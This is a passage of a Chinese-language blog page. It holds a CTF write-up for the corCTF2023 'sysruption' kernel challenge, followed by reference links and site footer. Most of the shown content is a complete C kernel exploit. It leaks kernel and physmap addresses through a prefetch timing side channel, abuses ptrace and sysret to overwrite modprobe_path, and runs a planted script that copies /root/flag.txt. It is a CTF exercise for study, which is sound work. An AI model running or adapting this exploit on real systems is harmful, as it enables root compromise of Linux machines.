class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span> #<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/reg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KERNEL_LOWER_BOUND 0xffffffff80000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KERNEL_UPPER_BOUND 0xffffffffc0000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KERNEL_BASE_ADDR 0xffffffff81000000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STEP_KERNEL 0x200000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCAN_START_KERNEL KERNEL_LOWER_BOUND</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCAN_END_KERNEL KERNEL_UPPER_BOUND</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARR_SIZE_KERNEL (SCAN_END_KERNEL - SCAN_START_KERNEL) / STEP_KERNEL</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PHYS_LOWER_BOUND 0xffff888000000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PHYS_UPPER_BOUND 0xfffffe0000000000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STEP_PHYS 0x40000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCAN_START_PHYS PHYS_LOWER_BOUND</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCAN_END_PHYS PHYS_UPPER_BOUND</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ARR_SIZE_PHYS (SCAN_END_PHYS - SCAN_START_PHYS) / STEP_PHYS</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DUMMY_ITERATIONS 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ITERATIONS 100</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KERNEL_GS_BASE 0xffff88813bc00000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PHYSMAP_BASE 0xffff888000000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MODE_PROBE_PATH_BASE 0xffffffff8203b840</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_UCOUNTS_BASE 0xffffffff8203b6c0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USER_PATH <span class="hljs-string">&quot;/tmp/x&quot;</span></span><br><span class="hljs-type">char</span> useful_shell[] = <span class="hljs-string">&quot;#!/bin/bash\ncat /root/flag.txt&quot;</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> kernel_base;<br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> physmap_offset;<br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> kaslr_offset;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">sidechannel</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span> &#123;<br>  <span class="hljs-type">uint64_t</span> a, b, c, d;<br>  <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mfence;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;rdtscp;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mov %0, rax;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mov %1, rdx;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;xor rax, rax;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;lfence;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;prefetchnta qword ptr [%4];&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;prefetcht2 qword ptr [%4];&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;xor rax, rax;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;lfence;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;rdtscp;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mov %2, rax;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mov %3, rdx;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;mfence;&quot;</span></span><br><span class="hljs-params">               <span class="hljs-string">&quot;.att_syntax;&quot;</span></span><br><span class="hljs-params">               : <span class="hljs-string">&quot;=r&quot;</span>(a), <span class="hljs-string">&quot;=r&quot;</span>(b), <span class="hljs-string">&quot;=r&quot;</span>(c), <span class="hljs-string">&quot;=r&quot;</span>(d)</span><br><span class="hljs-params">               : <span class="hljs-string">&quot;r&quot;</span>(addr)</span><br><span class="hljs-params">               : <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-string">&quot;rbx&quot;</span>, <span class="hljs-string">&quot;rcx&quot;</span>, <span class="hljs-string">&quot;rdx&quot;</span>)</span>;<br>  a = (b &lt;&lt; <span class="hljs-number">32</span>) | a;<br>  c = (d &lt;&lt; <span class="hljs-number">32</span>) | c;<br>  <span class="hljs-keyword">return</span> c - a;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">prefetch</span><span class="hljs-params">(<span class="hljs-type">int</span> phys)</span> &#123;<br>  <span class="hljs-type">uint64_t</span> arr_size = ARR_SIZE_KERNEL;<br>  <span class="hljs-type">uint64_t</span> scan_start = SCAN_START_KERNEL;<br>  <span class="hljs-type">uint64_t</span> step_size = STEP_KERNEL;<br>  <span class="hljs-keyword">if</span> (phys) &#123;<br>    arr_size = ARR_SIZE_PHYS;<br>    scan_start = SCAN_START_PHYS;<br>    step_size = STEP_PHYS;<br>  &#125;<br><br>  <span class="hljs-type">uint64_t</span> *data = <span class="hljs-built_in">malloc</span>(arr_size * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br>  <span class="hljs-built_in">memset</span>(data, <span class="hljs-number">0</span>, arr_size * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br><br>  <span class="hljs-type">uint64_t</span> min = ~<span class="hljs-number">0</span>, addr = ~<span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ITERATIONS + DUMMY_ITERATIONS; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint64_t</span> idx = <span class="hljs-number">0</span>; idx &lt; arr_size; idx++) &#123;<br>      <span class="hljs-type">uint64_t</span> test = scan_start + idx * step_size;<br>      syscall(<span class="hljs-number">104</span>);<br>      <span class="hljs-type">uint64_t</span> time = sidechannel((<span class="hljs-type">uint64_t</span>)test);<br>      <span class="hljs-keyword">if</span> (i &gt;= DUMMY_ITERATIONS)<br>        data[idx] += time;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; arr_size; i++) &#123;<br>    data[i] /= ITERATIONS;<br>    <span class="hljs-keyword">if</span> (data[i] &lt; min) &#123;<br>      min = data[i];<br>      addr = scan_start + i * step_size;<br>      <span class="hljs-comment">// printf(&quot;addr[%d]:0x%lx time:%ld\n&quot;, i, addr, data[i]);</span><br>    &#125;<br>  &#125;<br><br>  <span class="hljs-built_in">free</span>(data);<br><br>  <span class="hljs-keyword">return</span> addr;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pid_t</span> trace_pid;<br><span class="hljs-type">int</span> connection = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_sysret</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-keyword">struct</span> user_regs_struct *user_regs)</span> &#123;<br>  <span class="hljs-type">long</span> orig_rax;<br>  <span class="hljs-type">int</span> status;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> <span class="hljs-title">regs</span>;</span><br>  <span class="hljs-type">size_t</span> kernel_gs_base = KERNEL_GS_BASE + physmap_offset;<br>  <span class="hljs-built_in">memcpy</span>(&amp;regs, user_regs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> user_regs_struct));<br>  trace_pid = fork();<br>  <span class="hljs-keyword">if</span> (trace_pid &lt; <span class="hljs-number">0</span>) &#123;<br>    perror(<span class="hljs-string">&quot;fork failed&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!trace_pid) &#123; <span class="hljs-comment">// 如果为0则说明是child</span><br>    <span class="hljs-keyword">if</span> (ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) &#123;<br>      perror(<span class="hljs-string">&quot;PTRACE_TRACEME&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;wrgsbase %0&quot;</span> ::<span class="hljs-string">&quot;r&quot;</span>(kernel_gs_base))</span>;<br>    raise(SIGSTOP);<br>    fork();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 否则是father</span><br>    waitpid(trace_pid, &amp;status, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 设置选项在下一个fork处停止被tracee，并自动开始跟踪新分叉的进程，该进程将以SIGSTOP</span><br>    <span class="hljs-comment">// 或 PTRACE_EVENT_STOP（如果使用PTRACE_SEIZE）开始。</span><br>    ptrace(PTRACE_SETOPTIONS, trace_pid, <span class="hljs-number">0</span>, PTRACE_O_TRACEFORK);<br>    <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, trace_pid, 0, 0);</span><br>    ptrace(PTRACE_CONT, trace_pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    waitpid(trace_pid, &amp;status, <span class="hljs-number">0</span>);<br>    regs.rip = <span class="hljs-number">0x8000000000000000</span>;<br>    regs.rcx = <span class="hljs-number">0x8000000000000000</span>;<br>    regs.rsp = addr;<br>    regs.eflags = <span class="hljs-number">0x246</span>;<br>    regs.r11 = <span class="hljs-number">0x246</span>;<br>    regs.ss = <span class="hljs-number">0x2b</span>;<br>    regs.cs = <span class="hljs-number">0x33</span>;<br>    regs.gs_base = <span class="hljs-number">-1</span>; <span class="hljs-comment">// for lessmindly overflowed</span><br>    <span class="hljs-comment">/* construct the fake path */</span><br>    ptrace(PTRACE_SETREGS, trace_pid, <span class="hljs-literal">NULL</span>, &amp;regs);<br>    ptrace(PTRACE_CONT, trace_pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    ptrace(PTRACE_DETACH, trace_pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> <span class="hljs-title">gift_house</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> KASLR</span><br>  kernel_base = prefetch(<span class="hljs-number">0</span>) - <span class="hljs-number">0xc00000</span>;<br>  physmap_offset = prefetch(<span class="hljs-number">1</span>) - <span class="hljs-number">0x140000000</span> - PHYSMAP_BASE;<br>  kaslr_offset = kernel_base - KERNEL_BASE_ADDR;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  kernel_base = KERNEL_BASE_ADDR;<br>  physmap_offset = <span class="hljs-number">0</span>;<br>  kaslr_offset = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]KERNEL_base %lx\n&quot;</span>, kernel_base);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]KALSR offset base %lx\n&quot;</span>, kaslr_offset);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]physmap_offset %lx\n&quot;</span>, physmap_offset);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>       i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> user_regs_struct) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span>);<br>       i++) &#123;<br>    ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)&amp;gift_house)[i] = <span class="hljs-number">0x782f706d742f</span>;<br>  &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  system(<span class="hljs-string">&quot;echo -ne \&quot;#!/bin/sh\necho peiwithhao\ncp /root/flag.txt &quot;</span><br>         <span class="hljs-string">&quot;/tmp/hackyeah\nchown ctf:ctf /tmp/hackyeah\&quot; &gt; /tmp/x&quot;</span>);<br>  system(<span class="hljs-string">&quot;chmod 777 /tmp/x&quot;</span>);<br><br>  system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/ctf/fake&quot;</span>);<br>  system(<span class="hljs-string">&quot;chmod 777 /home/ctf/fake&quot;</span>);<br><br>  do_sysret((<span class="hljs-type">uint64_t</span>)MODE_PROBE_PATH_BASE + <span class="hljs-number">0xa0</span> + kaslr_offset, &amp;gift_house); <span class="hljs-comment">//</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Will get shell&quot;</span>);<br>  sleep(<span class="hljs-number">3</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>       i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> user_regs_struct) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span>);<br>       i++) &#123;<br>    ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)&amp;gift_house)[i] = <span class="hljs-number">0xAAAAAAA</span> + i;<br>  &#125;<br>  gift_house.r14 = <span class="hljs-number">0xffff888100049600</span> + physmap_offset;<br>  gift_house.r13 = <span class="hljs-number">0xffffffff82649160</span> + kaslr_offset;<br>  gift_house.r12 = <span class="hljs-number">0xffffffff8203a320</span> + kaslr_offset;<br>  gift_house.rbp = <span class="hljs-number">0x2c00000000</span>;<br>  do_sysret((<span class="hljs-type">uint64_t</span>)INIT_UCOUNTS_BASE + <span class="hljs-number">0xa0</span> + kaslr_offset, &amp;gift_house);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Gets the fake file....&quot;</span>);<br>  sleep(<span class="hljs-number">1</span>);<br>  system(<span class="hljs-string">&quot;/home/ctf/fake&quot;</span>);<br>  system(<span class="hljs-string">&quot;cat /tmp/hackyeah&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="0xFF-Nice-Blog-x2F-Paper"><a href="#0xFF-Nice-Blog-x2F-Paper" class="headerlink" title="0xFF Nice Blog&#x2F;Paper"></a>0xFF Nice Blog&#x2F;Paper</h1><p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html">Google Project sidechannel</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-280422.htm">Xiaozaya师傅的复现</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.willsroot.io/2023/08/sysruption.html">FizzBuzz大师出题手记</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/12/entrybleed.html">EntryBleed攻击手法的提出</a></p>
+<p><a target="_blank" rel="noopener" href="https://zolutal.github.io/corctf-sysruption/">zolutal一血解法 帅</a></p>
+<p><a target="_blank" rel="noopener" href="https://duasynt.com/blog/cve-2014-4699-linux-kernel-ptrace-sysret-analysis">早期Sysret bug提权</a><br><a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/12/entrybleed.html">EntryBleed</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTFwp/" class="category-chain-item">CTFwp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PWN/">#PWN</a>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+        <a href="/tags/Kernel/">#Kernel</a>
+      
+        <a href="/tags/Syscall/">#Syscall</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>corCTF2023-sysruption赛题复现</div>
+      <div>https://peiandhao.github.io/2024/05/23/corCTF2023-sysruption/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>peiwithhao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/15/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2022-0847漏洞复现">
+                        <span class="hidden-mobile">CVE-2022-0847漏洞复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","appKey":"Vr60qrZIptqhJaXqWvDEknkH","path":"window.location.pathname","placeholder":"锐评一下","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Pei</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Hao</span></a> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
